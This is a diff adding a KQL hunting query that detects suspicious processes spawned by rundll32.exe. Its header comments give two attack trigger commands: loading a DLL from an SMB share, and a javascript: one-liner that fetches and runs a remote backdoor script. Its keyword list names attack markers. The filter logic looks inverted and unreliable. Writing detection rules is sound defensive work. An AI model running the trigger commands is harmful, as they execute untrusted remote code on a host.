@@ -1,0 +1,23 @@
+// Title: [Hunting] - Suspicious Process spwan by rundll32.exe
+// Ref - https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
+// Ref - https://redcanary.com/threat-detection-report/techniques/rundll32/
+// Ref - https://www.cybereason.com/blog/rundll32-the-infamous-proxy-for-executing-malicious-code
+// Ref - https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/
+// MITRE: https://attack.mitre.org/techniques/T1218/011/ (Defense Evasion: System Binary Proxy Execution: Rundll32)
+// Severity: medium (if commented out knownCmdline)
+// Trigger: rundll32.exe \\10.10.10.10\share\payload.dll,EntryPoint
+// Trigger: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")
+// Usecase: Execute DLL from SMB share
+// Usecase: Execute code from Internet
+// By: Frankie Li
+// On: 15-05-2023
+let knownFiles = dynamic(['WinSAT.exe','conhost.exe', 'rundll32.exe','mmc.exe','BWCUpdater.exe','iexplore.exe',
+    'UpdateBrowserforApp.exe','gpresult.exe','chrome.exe','msiexec.exe', 'ping.exe', 'ipconfig.exe']);
+let knownProcesses = dynamic(['rundll32.exe','cmd.exe']);
+let knownCmdline = dynamic(['EntryPoint','\\share','javascript:','w.run','-sta','ADSDLL.dll','comsvcs.dll', 'whoami']);
+DeviceProcessEvents 
+| where (InitiatingProcessParentFileName has_any (knownProcesses) or InitiatingProcessFileName has_any (knownProcesses)) 
+    and (not(FileName has_any (knownFiles) or not(InitiatingProcessParentFileName == "PangpHip.exe")))
+| where ProcessCommandLine has_any (knownCmdline)
+| project Timestamp, AccountName, Parent = InitiatingProcessParentFileName, InitiatingProcessFileName, FileName, ProcessCommandLine, DeviceName
+
